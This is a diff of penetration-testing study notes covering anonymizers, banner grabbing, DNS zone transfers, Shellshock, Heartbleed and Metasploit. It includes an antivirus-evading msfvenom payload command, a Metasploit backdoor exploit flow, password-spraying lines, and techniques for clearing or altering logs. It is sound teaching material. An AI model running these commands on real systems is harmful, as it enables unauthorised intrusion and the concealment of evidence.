+  - **Cons**: Less resistance to sophisticated analysis
+
+#### Anonymizer tools
+
+- OS
+  - [Tails](https://tails.boum.org/): Live OS to protect against surveillance and censorship
+  - [Whonix](https://www.whonix.org/): Designed to run in VMs to increase security and privacy
+- Software
+  - [Invisible Internet Project (I2P)](https://geti2p.net)
+  - [TunnelBear](https://www.tunnelbear.com)
+- Mobile apps
+  - [Orbot](https://guardianproject.info/apps/org.torproject.android/): Proxy with Tor
+  - [Psiphon](https://psiphon3.com/en/index.html): Tunnel through VPN on Android
+
+##### Tor
+
+- Free and open-source software for enabling anonymous communication
+- 📝 Stronger privacy than single [node proxies](#proxy-servers) or [proxy chains](#proxy-chaining) without encryption
+- ❗ Anonymous as long as guard and exit nodes are not the same party and the traffic is over HTTPs
+- VPN / Proxies (non-chained): Single point of failure
+  - Provider knows who you are and what you browse
+  - Provider may inject packets (e.g. ads) into traffic or record personal details.
+- Tor traffic goes through at least 3 different servers (up to 5000) before destination
+  - Provides separate encryption layer for each server
+  - An observer cannot read or modify packets
+  - Second server (middle relay) passes encrypted data without knowing more than its predecessor and descendant
+  - Weaknesses
+    - ❗ A bad first server (guard node) knows your IP but not what you sent or where.
+    - ❗ A bad third server (exit node) sees your traffic but cannot know who sent the traffic.
+      - ❗ Exit node can eavesdrop if the packet is not using HTTPS but HTTP
+    - ❗ Will be no privacy if both the entry and exit nodes are hijacked by same hostile party.
+
+##### I2P (Invisible Internet Project)
+
+- Peer-to-peer alternative to [Tor](#tor)
+- Each participant acts both as a client and as a router
+# Banner grabbing
+
+- **Banner information** = name + version
+- 📝 Used to gain banner information about
+  - a computer (e.g. OS information)
+  - the services running on its open ports (e.g. nginx server)
+- Allows attackers to exploit known vulnerabilities and form an attack plan.
+- Can be prevented by disabling banners and by hiding web page extensions.
+
+## Passive banner grabbing
+
+- Uses sniffing to determine the operating system.
+- E.g. analyzing error messages, sniffing the traffic on the network, and examining page extensions.
+
+## Active banner grabbing
+
+- Sending a packet to the OS and then analyzing the responses.
+- E.g. each OS have different TCP/IP stack implementations.
+  - Values of TTL (time to live) and TCP window size in the IP header of the first packet are different in each OS.
+- HTTP (80), FTP (21), SMTP (25) are common ports.
+- Tools include `telnet`, [`nmap`](./scanning-tools.md#nmap), [`zgrap`](https://github.com/zmap/zgrab2) and `netcat`.
+
+### Banner grabbing tools
+
+- `nmap -O` for OS automatic fingerprinting, see also [`-O`: OS fingerprinting | Scanning tools](./scanning-tools.md#-o-os-fingerprinting)
+
+#### Netcat
+
+- Networking utility for reading from and writing to network connections using TCP or UDP
+- 🤗 Also known as TCP/IP swiss army knife
+- **FTP**
+  - `nc 178.128.203.1 21`: Checks FTP port 21
+    - 💡 You can use `nmap 178.128.203.1` to find out open ports.
+  - Usual for FTP servers to return something like `Welcome to XXX FTP Server`
+    - gives you insights about the owner and that it's a FTP server
+- **HTTP**
+  - E.g.
+    1. `nc 178.128.203.1 80`
+    2. Type e.g. `GET /index.html HTTP 1.0` or `HEAD / HTTP/1.1`
+    3. Press `[ENTER]`
+  - And also usually useful headers such as `Server: Apache/2.4.6 (CentOS)`
+- [CryptCat](http://cryptcat.sourceforge.net/) is the encrypted version of netcat
+
+#### Telnet
+
+- Application protocol for bidirectional interactive text-oriented communication using a virtual terminal connection
+- Historically used to access to a command-line interface on a remote host but now replaced with [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) as it's unsecure.
+- Built into many operative systems as default
+- Runs on port 23 so `telnet <target>` sends TCP to targets port 23.
+  - You can send to different ports using `telnet`
+- If port is open a banner response received looking like:
+  - `Server: Microsoft-IIS/5.0 Date: Fri, 14 Aug 2009 1:14:42 GMT Content-Length:340 Content-Type: text/html`
 # Enumeration overview
 
 - Actively engage a system and query it for information.
@@ -4191,187 +3912,167 @@
      - `net use \\%computername% "PasswordTest1" /u:admin@cloudarchitecture.io`
      - `net use \\%computername% "PasswordTest2" /u:admin@cloudarchitecture.io`
      - ...
-# Automated penetration testing tools
+# DNS enumeration
 
-- [CANVAS](https://immunityinc.com/products/canvas/) (proprietary)
-  - Exploit gallery and development framework
-- [Core Impact](https://www.coresecurity.com/products/core-impact) (proprietary)
-  - All-inclusive automated testing framework
-- Nmap with custom scripts
-  - Can used for • [footprinting](./../02-footprinting/network-footprinting.md#nmap) • [scanning](./../03-scanning-networks/scanning-tools.md#nmap) • [vulnerability analysis](./vulnerability-analysis.md#nmap)
-  - Also to carry out attacks e.g. as [DoS tool](./../13-web-applications/denial-of-service.md#dos-tools)
+## DNS
 
-## Automated vs manual penetration testing
+- Stands for "Domain Name System"
+- Hierarchical and decentralized naming system
+- Used for resources connected to the Internet including computers and services
+- Runs on TCP/UDP port 53
 
-- Automated testing cannot fully replace manual testing but as it has its own advantages and disadvantages
-- **Automated testing advantages**
-  - Help the initial analysis to understand where potential vulnerabilities exist
-  - Enable the testers to build efficient exploit strategies to confirm the security vulnerabilities and weaknesses.
-  - Same pen test multiple times from different entry points
-  - Reduces costs
-- **Automated testing disadvantages**
-  - It can miss unforeseen instances
-  - Usually works from "inside" of the network
-  - Fails to work in complex scenarios
-  - Usually does not exploit the vulnerabilities
-  - Not as creative as humans (yet 😉) in e.g. social engineering
+### DNS records
 
-## Metasploit
+- Database record used to map a URL to an IP address
+- Stored in zone files in DNS servers
+  - A DNS server contains a "zone file" for each domain
+  - Zone file is made up of "resource records" (RRs)
+- Helps users connect their websites to the outside world.
+- 📝 Common DNS records include
+  - **`A`**
+    - Points a domain to an IPv4 address, such as `11.22.33.44`.
+  - **`AAAA`**
+    - Points a domain to an IPv6 address, such as `FE80::0202:B3FF:FE1E:8329`.
+  - **`MX`**
+    - Mail eXchange records are used to direct emails sent to domain
+    - See also [MX records | Whois, GeoIpLocation and DNS interrogation](./../02-footprinting/whois-geoiplocation-and-dns-interrogation.md#mx-records)
+  - **`NS`**
+    - Used to delegate a domain or subdomain to a set of name servers
+  - **`SOA`**
+    - Contains data to control the zone transfer.
+    - Includes serial number, timestamps, mail address of zone responsible..
+    - E.g.
 
-- 📝 Framework for building and performing exploit attacks against targets.
-- [Source code](https://github.com/rapid7/metasploit-framework) | [Website](https://www.metasploit.com/)
-- Modular architecture allowing code re-use instead of copying or re-implement on a per-exploit basis
+      ```txt
 
-### Free version
+        $TTL 86400
+        @   IN  SOA     ns.icann.org. noc.dns.icann.org. (
+                2020080302  ;Serial
+                7200        ;Refresh
+                3600        ;Retry
+                1209600     ;Expire
+                3600        ;Minimum TTL
+        )
 
-- Developing and executing exploit code against a remote target machine.
-- Database of vulnerabilities and platform to execute different exploits for them.
-- [Fuzzing](./../14-sql-injection/sql-injection-overview.md#fuzz-testing) tools to discover vulnerabilities
-- Automated exploitation of known vulnerabilities such as weak passwords for e.g. Telnet, SSH, HTTP.
-- Manual exploitation and manual brute forcing
-- Zenmap (Nmap GUI)
+      ```
 
-### Paid (Pro) version
+  - **`CNAME`**
+    - Link a subdomain to a domain's existing A or AAAA record
+    - E.g. `www.cloudarchitecture.io` to `cloudarchitecture.io`
+  - **`PTR`**
+    - Opposite of `A`, points an IP to domain
+    - Commonly used for spam verification for e-mail programs
+  - **`HINFO`**
+    - System information including CPU and OS type.
 
-- Web application testing (OWASP Top 10)
-- Dynamic payloads for anti-virus evasion
-- Has web interface
-  - 💡📝 A free alternative is [**Armitage**](http://www.fastandeasyhacking.com/) that's [open-source](https://github.com/rsmudge/armitage) GUI.
+## DNS enumeration techniques
 
-### Metasploit interfaces
+- Check all NS Records for [zone transfers](#zone-transfers).
+- Enumerate general [DNS records](#dns-records) for a given domain.
+- Perform common SRV Record Enumeration.
+  - Service records contain the hostname, port and priority of servers for a given service.
+  - Enumerates e.g. • LDAP • Autodiscover for Exchange • Kerberos...
+  - E.g. by `nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='google.com'"`
+- Brute force subdomain and host A and AAAA records discovery with given top domain and wordlist.
+- DNS PTR lookup given a IP range CIDR range
+  - Querying dns for PTR record of each IP in subnet
+- See also [DNS interrogation](./../02-footprinting/whois-geoiplocation-and-dns-interrogation.md#dns-interrogation)
 
-#### `meterpreter`
+### DNS cache snooping
 
-- 📝 Payload that provides control over an exploited target system
-- Runs as a DLL loaded inside of any process on a target machine
-- Resides entirely in memory and writes nothing to disk
+- Checks a DNS server cached records.
+   Done by performing **non-recursive** (or also known as **iterative**) DNS queries
+  - Also known as iterative query
+  - Server returns either its own record or another DNS server that may know the answer.
+  - As opposed to [recursive DNS lookup](../12-web-servers/web-server-threats-and-attacks.md#recursive-dns-lookup) where servers communicates with other DNS servers.
+- **Tools**
+  - Automated: [dnsrecon](#dnsrecon)
+  - 📝 Manual:
+    - `dig` with `+norecurse` flag
+    - `nslookup` with `-norecurse` flag
+    - `host` with `-r` flag
 
-#### `msfvenom`
+## Zone transfers
 
-- Generates stand-alone payload
-- 📝 Combines
-  - Payload generation (old tool: `msfpayload`)
-    - `-p <payload-name>` e.g. `-p windows/meterpreter/bind_tcp`
-    - `-f <format>` e.g. `-f exe` or `-f raw` (shellcode)
-  - Encoding (old tool: `msfencode`)
-    - Used to avoid antivirus detection
-    - Done by `-b` or `-e` flags
-    - `-i <number>` allows encoding multiple times for more stealth
-- E.g. `msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python`
-- See also [msfvenom | Hiding files](../06-system-hacking/hiding-files.md#msfvenom)
+- DNS server passes a copy of part of it's database ("zone") to another DNS server
+- There's one master DNS server, and one or more slave DNS servers
+  - Slaves ask master for a copy of records
+- Uses TCP port 53
+- 📝 Uses **AXFR** (full) protocol or **IXFR** (incremental).
+- The secondary server request a new copy if the primary SOA serial number is higher.
+  - The primary increments the serial number every time the SOA changes
+  - If the secondary checks in and the primary’s copy has a higher serial number
 
-#### `msfconsole`
+### DNS zone transfer attack
 
-- All-in-one centralized console for all of the options available in the MSF
-- Contains the most features and is the most stable MSF interface
-- E.g. flow for using unreal exploit:
-  1. Run `msfconsole`
-  2. You can search for a service e.g. `unrealirc`
-     - ❗Disclosure date is not same as when vulnerability found, it can be before but not published.
-  3. Use with `use exploit/unix/irc/unreal_ircd_3281_backdoor`
-     - There can be multiple payloads, check with `show payload` and then set with `set PAYLOAD <name>`
-     - Set required options (`show options` to list) and `set <option-name> <option-value>`to set
-  4. Run exploit using `exploit`
-     - Hopefully you'll end up in terminal session as root :)
-# Common vulnerabilities
+- Pretending to be a slave and ask for records
+- Allows an attacker to obtain sensitive information about internal DNS records (network).
+- 📝 Flow
+  1. Get NS records (DNS servers that are responsible for resolving the queries)
+     - Using `dig`: `dig ns zonetransfer.me` or `dig +short ns zonetransfer.me`
+     - Using `nslookup`: `nslookup zonetransfer.me`
+  2. Initiate AXFR request to get a copy of the zone from name server
+     - Using `dig`: `dig axfr @<DNS you are querying> <target>`
+       - E.g. `dig axfr @nsztm1.digi.ninja zonetransfer.me`
+     - Using `nslookup`
+       - `nslookup -ls -d nsztm1.digi.ninja`
+         - `-d`: list all records for DNS domain
+         - Sends AXFR query to the remote nameserver
+         - Initiates zone transfer if and only if the remote nameserver is dumb enough to respond to unsolicited, unauthorized AXFRs originating from random machines on the Internet.
+       - Or using interactive mode with specified a DNS server:
 
-## Shellshock
+       ```txt
+         $ nslookup
+         > server <DNS you are querying>
+         > set type=any
+         > ls -d <target>
+       ```
 
-- Also known as ***bashdoor*** or ***bash bug***
-- Privilege escalation vulnerability enabling arbitrary commands execution
-- 📝 Caused by family of security bugs in the Unix Bash shell
-- Related CVE entries include: • *CVE-[2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)*, *CVE-[2014-6277](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6277)* • *CVE-[2014-6278](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-6278)*, *CVE-[2014-7169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169)* • *CVE-[2014-7186](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7186)*, *CVE-[2014-7187](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7187)*
-- Achieved by manipulating the environment variable list and then cause Bash to run
-- Upon startup Bash parser executes scripts saved as environment variables
-- E.g. `$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`
-  - Prints first `vulnerable` then `this is a test`
-- To exploit there needs to be away to talk to Bash.
-- Often exploits websites using CGI
-  - CGI stands for "Common Gateway Interface"
-  - In Apache it's done using [mod_cgi](https://httpd.apache.org/docs/2.4/mod/mod_cgi.html)
-    - Way to let Apache execute script files and send the output to the client
-    - Apache passes information to CGI scripts using environment variables
-  - E.g. if you you have a HTTP header named `Sike` in your request, you will have an
-environment variable named `HTTP_SIKE` available in your CGI.
-- Big impact
-  - Thousands of attacks were reported when the bug was revealed including botnets against [United States Department of Defense](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#cite_note-IT-20140926-JS-10).
-  - > "Shellshock makes Heartbleed look insignificant" - [ZDNet](https://www.zdnet.com/shellshock-makes-heartbleed-look-insignificant-7000034143/)
+     - Or `nslookup -query=AXFR <target> <DNS you are querying>`
+     - Using `host`: `host -l nsztm1.digi.ninja`
+- 🤗 In June 2017 the registrar responsible for Russian top-level-domains accidentally enabled DNS zone transfers via AXFR which led to 5.6 million records being accidentally exposed | [source](https://securitytrails.com/blog/russian-tlds)
 
-### Detecting Shellshock using Nmap
+### Zone transfers countermeasures
 
-- Can use [Shellshock script](https://Nmap.org/nsedoc/scripts/http-shellshock.html) with Nmap scripting engine.
-- `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/blabla.sh,cmd=ls 192.168.122.17.8`
-  - `-sV`: detect services and versions
-  - `-p`: port 80, you can also do -p- to scan for entire port range
-  - `--script`: You can test different scripts / vulnerabilities, choose anything from [scripts page](https://Nmap.org/nsedoc/scripts)
-  - `--script-args`: optional, 2 args, uri and cmd
+- Do not allow or restrict zone transfers
+- Use [split DNS](#split-dns)
 
-## SSL/TLS Vulnerabilities
+#### Split DNS
 
-### Heartbleed
+- Also known as ***split-horizon DNS***, ***split-view DNS***, ***split-brain DNS*** or ***split DNS***
+- 📝 Separation of internal network (intranet) DNS and public network (Internet) DNS
+- Provides different answers to DNS queries based on the source address of the DNS request.
+- Can be accomplished with hardware or software solutions
 
-- 📝 Bug in [OpenSSL](https://www.openssl.org/) library a widely used implementation of TLS.
-- Introduced and patched in April 2014.
-- Results from improper input validation (no boundary check) in TLS heartbeat extension
-- Causing server to send more data in the memory than it allowed
-  - Classified as **buffer over-read**
-- Flow
-  - TLS/DTLS Heartbeat flow:
-    - Client: `Send me 4 letter word: "bird"` -> Server: `"bird"`
-  - Malicious Heartbeat flow:
-    - Client: `Send me 500 letter word: "bird"` -> Server: `bird. Server master key is 3131531535. User Carol wants to change password to "password 1 2 3"...`
-- **Reverse Heartbleed**
-  - Malicious server exploiting Heartbleed to read from client memory.
-- Millions of webpages were affected, still there are IoT devices are vulnerable (see [shodan search](https://www.shodan.io/report/0Wew7Zq7))
-- Had big impact, some known ones are [stealing of millions of patient records](http://time.com/3148773/report-devastating-heartbleed-flaw-was-used-in-hospital-hack/), [hijacking accounts CEO impersonation](https://www.bbc.co.uk/news/technology-27028101) ....
-  - > "Heartbleed is the worst vulnerability found" - [Forbes](https://www.forbes.com/sites/josephsteinberg/2014/04/10/massive-internet-security-vulnerability-you-are-at-risk-what-you-need-to-do/)
-- Can be exploited
-  - Using Nmap: `nmap -p 443 --script ssl-heartbleed <target>`
-    - Will return "State: NOT VULNERABLE" if not vulnerable.
-  - Using Metasploit: [openssl_heartbleed](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssl/openssl_heartbleed.md) module
+## DNS enumeration tools
 
-### POODLE
+### dnsrecon
 
-- POODLE stands for "Padding Oracle On Downgraded Legacy Encryption"
-- 📝 Forcing a degradation to a vulnerable SSL/TLS version
-  - TLS handshakes are walked down the connection until a usable/vulnerable one is found
-  - Exploits backwards compatibility
-- Man-in-the-middle exploit
-- Affects both SSL and TLS
-  - Vulnerability was disclosed in October 2014 for SSL.
-  - A variation used to attack TLS was disclosed in December 2014.
-- **POODLE attack against SSL**
-  - Takes advantage of Internet and security software clients' fallback to SSL 3.0.
-  - Attackers make 256 SSL 3.0 request on average to reveal a single byte.
-- **POODLE attack against TLS**
-  - Caused by some implementation not following the TLS specifications.
-  - Exploits CBC encryption mode in the TLS 1.0 - 1.2 protocols
+- [Open source](https://github.com/darkoperator/dnsrecon) python script
+- E.g. `./dnsrecon.py -d cloudarchitecture.io`
+- Enumerates DNS records and more
 
-### FREAK
+### nslookup
 
-- Stands for "Factoring RSA Export Keys"
-- Man-in-the-middle attack forcing downgrade of RSA key to a weaker length
-- Enables successful brute-force attacks.
-- Exploits cryptographic weakness in the SSL/TLS protocols
+- Limited: Depends on existence of DNS reverse lookup zone.
+- Forward lookup (normal): Here's name give me IP
+- Reverse lookup: Here's IP give me back the name
 
-### SSL/TLS Renegotiation
+### dig
 
-- 📝 Leads to plaintext injection attacks against SSL 3.0 and all current versions of TLS
-- **Background**
-  - Marsh Ray and Steve Dispensa release a document discussing a vulnerability in the design of TLS – November 4, 2009
-  - Turkish grad student, Anil Kurmus, exploits the vulnerability to steal Twitter login credentials – November 10, 2009
-- **Mitigation**
-  - Quick fix was the renegotiation
-  - Proposed standard ([RFC 5746](https://tools.ietf.org/html/rfc5746)) is to verify previous renegotiation handshakes between client and server.
-- **Testing**
-  - Use `open_ssl s_client -connect <website>:443`
-  - Then type `R` for renegotiate and `[ENTER]`
+- *Nix tool for querying DNS
+- E.g. `dig cloudarchitecture.io any`
+  - `any` argument (optional): all records it can find
+- `dig axfr cloudarchitecture.io`
 
-### DROWN
+### `host`
 
-- Stands for "Decrypting RSA with Obsolete and Weakened eNcryption"
-- Exploits modern SSL/TLS suites by exploiting their obsolete SSLv2 protocol support.
-- The only viable countermeasure is to disable SSLv2 on all servers
+- On Unix-like operating systems, the `host` command is a DNS lookup utility
+- Using e.g. `host <target-domain>` to see all records.
+- 📝 You can also set type `-t` to see specific records e.g.
+  - `host -t a <target-domain>` to see A records
+  - `host -t ns <target-domain>` to see NS records
+  - ...
 # Vulnerability analysis
 
 - **Vulnerability research** helps identify vulnerabilities which could compromise the system
@@ -4509,93 +4210,187 @@ environment variable named `HTTP_SIKE` available in your CGI.
 - Identifies missing security updates and common security misconfigurations
 - Assesses Windows and its sofware e.g.• Internet Explorer • IIS web server • Microsoft SQL Server, • Office macro settings
 - It's [deprecated](https://docs.microsoft.com/en-us/windows/security/threat-protection/mbsa-removal-and-guidance)
-# Covering tracks
+# Common vulnerabilities
 
-- Attempt to hide attackers presence on the system so the system appears uncompromised.
-- To avoid detection the attacker needs to
-  - modify the system logs and delete their activity during the attack.
-  - ensure that future activities are not logged
-- You can mitigate damage by reducing footprint by e.g. making your access disguise a legit process.
-- 💡 Have an exit strategy prior to breaking in by getting to know OS type, log types, policies (e.g. log altered alarms) and applications running on it.
-  - E.g. if you know OS you can know where in general the OS keeps logs (e.g. `/var/log/`)
-  - ❗ There's no universal way to figure out where all the logs are in a system
-- Log file permissions
-  - Common and big mistake: bad permissions on log files
-    - Allows access from a lot of users that shouldn't
-  - E.g. to read system messages you need to become root `sudo tail /var/log/messages`
-- Terminal history
-  - Might leave footprints here for commands you run.
-  - Good place to learn about the user (they sometimes write passwords by mistake).
-  - You can run `history` to get the history.
-    - In (fedora) saved in `home/<username>/.bash_history`
+## Shellshock
 
-## Security logs
+- Also known as ***bashdoor*** or ***bash bug***
+- Privilege escalation vulnerability enabling arbitrary commands execution
+- 📝 Caused by family of security bugs in the Unix Bash shell
+- Related CVE entries include: • *CVE-[2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)*, *CVE-[2014-6277](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6277)* • *CVE-[2014-6278](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-6278)*, *CVE-[2014-7169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169)* • *CVE-[2014-7186](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7186)*, *CVE-[2014-7187](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7187)*
+- Achieved by manipulating the environment variable list and then cause Bash to run
+- Upon startup Bash parser executes scripts saved as environment variables
+- E.g. `$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`
+  - Prints first `vulnerable` then `this is a test`
+- To exploit there needs to be away to talk to Bash.
+- Often exploits websites using CGI
+  - CGI stands for "Common Gateway Interface"
+  - In Apache it's done using [mod_cgi](https://httpd.apache.org/docs/2.4/mod/mod_cgi.html)
+    - Way to let Apache execute script files and send the output to the client
+    - Apache passes information to CGI scripts using environment variables
+  - E.g. if you you have a HTTP header named `Sike` in your request, you will have an
+environment variable named `HTTP_SIKE` available in your CGI.
+- Big impact
+  - Thousands of attacks were reported when the bug was revealed including botnets against [United States Department of Defense](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#cite_note-IT-20140926-JS-10).
+  - > "Shellshock makes Heartbleed look insignificant" - [ZDNet](https://www.zdnet.com/shellshock-makes-heartbleed-look-insignificant-7000034143/)
 
-### Windows security logs
+### Detecting Shellshock using Nmap
 
-- Event logs for are stored in `C:\Windows\System32\winevt\Logs`
-- Can use OS tool "Windows Event Viewer" to navigate the logs
-- Logs are categorized as application, security and system.
+- Can use [Shellshock script](https://Nmap.org/nsedoc/scripts/http-shellshock.html) with Nmap scripting engine.
+- `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/blabla.sh,cmd=ls 192.168.122.17.8`
+  - `-sV`: detect services and versions
+  - `-p`: port 80, you can also do -p- to scan for entire port range
+  - `--script`: You can test different scripts / vulnerabilities, choose anything from [scripts page](https://Nmap.org/nsedoc/scripts)
+  - `--script-args`: optional, 2 args, uri and cmd
 
-### Linux security logs
+## SSL/TLS Vulnerabilities
 
-- Centralized repository of log files are in `/var/log` directory.
-  - See also [Linux folders | Linux basics](./linux-basics.md#linux-folders)
-- 📝 Log folders include
-  - `/var/log/messages` | `/var/log/syslog` (debian-based)
-    - Generic system activity logs
-  - `/var/log/auth.log` (Debian and Ubuntu) | `/var/log/secure` (RedHat and CentOS)
-    - Authentication/authorization related events
-    - E.g. [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) logs
-  - • `/var/log/utmp` • `/var/log/wtmp` • `/var/log/btmp` | `/var/log/faillog`
-    - Login/logout events
-  - `/var/log/lastlog`
-    - Display information about a user's last login time
-  - `/var/log/cron`
-    - Cron service logs
-    - Can include failed authorizations
-  - `/var/log/secure`
-    - Authentication and authorization privileges.
-    - E.g. sshd logs including unsuccessful login.
+### Heartbleed
 
-## Techniques of covering tracks
+- 📝 Bug in [OpenSSL](https://www.openssl.org/) library a widely used implementation of TLS.
+- Introduced and patched in April 2014.
+- Results from improper input validation (no boundary check) in TLS heartbeat extension
+- Causing server to send more data in the memory than it allowed
+  - Classified as **buffer over-read**
+- Flow
+  - TLS/DTLS Heartbeat flow:
+    - Client: `Send me 4 letter word: "bird"` -> Server: `"bird"`
+  - Malicious Heartbeat flow:
+    - Client: `Send me 500 letter word: "bird"` -> Server: `bird. Server master key is 3131531535. User Carol wants to change password to "password 1 2 3"...`
+- **Reverse Heartbleed**
+  - Malicious server exploiting Heartbleed to read from client memory.
+- Millions of webpages were affected, still there are IoT devices are vulnerable (see [shodan search](https://www.shodan.io/report/0Wew7Zq7))
+- Had big impact, some known ones are [stealing of millions of patient records](http://time.com/3148773/report-devastating-heartbleed-flaw-was-used-in-hospital-hack/), [hijacking accounts CEO impersonation](https://www.bbc.co.uk/news/technology-27028101) ....
+  - > "Heartbleed is the worst vulnerability found" - [Forbes](https://www.forbes.com/sites/josephsteinberg/2014/04/10/massive-internet-security-vulnerability-you-are-at-risk-what-you-need-to-do/)
+- Can be exploited
+  - Using Nmap: `nmap -p 443 --script ssl-heartbleed <target>`
+    - Will return "State: NOT VULNERABLE" if not vulnerable.
+  - Using Metasploit: [openssl_heartbleed](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssl/openssl_heartbleed.md) module
 
-- **Disabling auditing**
-  - Disabling auditing features of the system
-  - Disabling logging is difficult
-    - Hard to know what kind of logs are being collected
-    - Can include OS logs, additional security mechanisms logs, side applications logs..
-    - Usually requires system restart for disabling of logs
-      - E.g. if you use SELinux (can check with `getenforce`) it has different modes: • permissive (just logs) • enforcing and • disabled state
-        - Setting its state to disabled requires a restart.
-- **Clearing logs**
-  - Deleting the attacker's logged activities
-  - ❗Suspicious if all logs are deleted may raise alarms.
-- **Manipulating logs**:
-  - Changing the logs to prevent detection
-  - E.g. search and replace your IP
-- To cover tracks on network, attackers use
+### POODLE
 
-### Covering tracks on network
+- POODLE stands for "Padding Oracle On Downgraded Legacy Encryption"
+- 📝 Forcing a degradation to a vulnerable SSL/TLS version
+  - TLS handshakes are walked down the connection until a usable/vulnerable one is found
+  - Exploits backwards compatibility
+- Man-in-the-middle exploit
+- Affects both SSL and TLS
+  - Vulnerability was disclosed in October 2014 for SSL.
+  - A variation used to attack TLS was disclosed in December 2014.
+- **POODLE attack against SSL**
+  - Takes advantage of Internet and security software clients' fallback to SSL 3.0.
+  - Attackers make 256 SSL 3.0 request on average to reveal a single byte.
+- **POODLE attack against TLS**
+  - Caused by some implementation not following the TLS specifications.
+  - Exploits CBC encryption mode in the TLS 1.0 - 1.2 protocols
 
-- **Reverse shell**
-  - Target system sends a request to the remote system to act on the response.
-  - **Reverse HTTP shells**
-    - Asks the master system for commands to execute on the target machine
-  - **Reverse ICMP tunnels**
-    - Accessing the system by using ICMP echo and reply packets as carriers of TCP payload
-- **DNS tunneling**
-  - Adding data payload to the target's DNS server to create a back channel to steal information
-- **TCP parameters**
-  - Using TCP parameters for payload distribution.
-  - Fields in which data can be hidden are e.g.
-    - IP identification field, TCP acknowledgement number, and TCP initial sequence number.
+### FREAK
 
-### Tools for covering tracks
+- Stands for "Factoring RSA Export Keys"
+- Man-in-the-middle attack forcing downgrade of RSA key to a weaker length
+- Enables successful brute-force attacks.
+- Exploits cryptographic weakness in the SSL/TLS protocols
 
-- [Privacy.sexy](https://privacy.sexy): Online/offline nad open source tool that can cleanup logs and personal activities.
-- [Auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol): Microsoft tool to manipulate audit policies.
-- [MRU-blaster](https://www.brightfort.com/mrublaster.html): Find and remove 30,000 MRU lists.
+### SSL/TLS Renegotiation
+
+- 📝 Leads to plaintext injection attacks against SSL 3.0 and all current versions of TLS
+- **Background**
+  - Marsh Ray and Steve Dispensa release a document discussing a vulnerability in the design of TLS – November 4, 2009
+  - Turkish grad student, Anil Kurmus, exploits the vulnerability to steal Twitter login credentials – November 10, 2009
+- **Mitigation**
+  - Quick fix was the renegotiation
+  - Proposed standard ([RFC 5746](https://tools.ietf.org/html/rfc5746)) is to verify previous renegotiation handshakes between client and server.
+- **Testing**
+  - Use `open_ssl s_client -connect <website>:443`
+  - Then type `R` for renegotiate and `[ENTER]`
+
+### DROWN
+
+- Stands for "Decrypting RSA with Obsolete and Weakened eNcryption"
+- Exploits modern SSL/TLS suites by exploiting their obsolete SSLv2 protocol support.
+- The only viable countermeasure is to disable SSLv2 on all servers
+# Automated penetration testing tools
+
+- [CANVAS](https://immunityinc.com/products/canvas/) (proprietary)
+  - Exploit gallery and development framework
+- [Core Impact](https://www.coresecurity.com/products/core-impact) (proprietary)
+  - All-inclusive automated testing framework
+- Nmap with custom scripts
+  - Can used for • [footprinting](./../02-footprinting/network-footprinting.md#nmap) • [scanning](./../03-scanning-networks/scanning-tools.md#nmap) • [vulnerability analysis](./vulnerability-analysis.md#nmap)
+  - Also to carry out attacks e.g. as [DoS tool](./../13-web-applications/denial-of-service.md#dos-tools)
+
+## Automated vs manual penetration testing
+
+- Automated testing cannot fully replace manual testing but as it has its own advantages and disadvantages
+- **Automated testing advantages**
+  - Help the initial analysis to understand where potential vulnerabilities exist
+  - Enable the testers to build efficient exploit strategies to confirm the security vulnerabilities and weaknesses.
+  - Same pen test multiple times from different entry points
+  - Reduces costs
+- **Automated testing disadvantages**
+  - It can miss unforeseen instances
+  - Usually works from "inside" of the network
+  - Fails to work in complex scenarios
+  - Usually does not exploit the vulnerabilities
+  - Not as creative as humans (yet 😉) in e.g. social engineering
+
+## Metasploit
+
+- 📝 Framework for building and performing exploit attacks against targets.
+- [Source code](https://github.com/rapid7/metasploit-framework) | [Website](https://www.metasploit.com/)
+- Modular architecture allowing code re-use instead of copying or re-implement on a per-exploit basis
+
+### Free version
+
+- Developing and executing exploit code against a remote target machine.
+- Database of vulnerabilities and platform to execute different exploits for them.
+- [Fuzzing](./../14-sql-injection/sql-injection-overview.md#fuzz-testing) tools to discover vulnerabilities
+- Automated exploitation of known vulnerabilities such as weak passwords for e.g. Telnet, SSH, HTTP.
+- Manual exploitation and manual brute forcing
+- Zenmap (Nmap GUI)
+
+### Paid (Pro) version
+
+- Web application testing (OWASP Top 10)
+- Dynamic payloads for anti-virus evasion
+- Has web interface
+  - 💡📝 A free alternative is [**Armitage**](http://www.fastandeasyhacking.com/) that's [open-source](https://github.com/rsmudge/armitage) GUI.
+
+### Metasploit interfaces
+
+#### `meterpreter`
+
+- 📝 Payload that provides control over an exploited target system
+- Runs as a DLL loaded inside of any process on a target machine
+- Resides entirely in memory and writes nothing to disk
+
+#### `msfvenom`
+
+- Generates stand-alone payload
+- 📝 Combines
+  - Payload generation (old tool: `msfpayload`)
+    - `-p <payload-name>` e.g. `-p windows/meterpreter/bind_tcp`
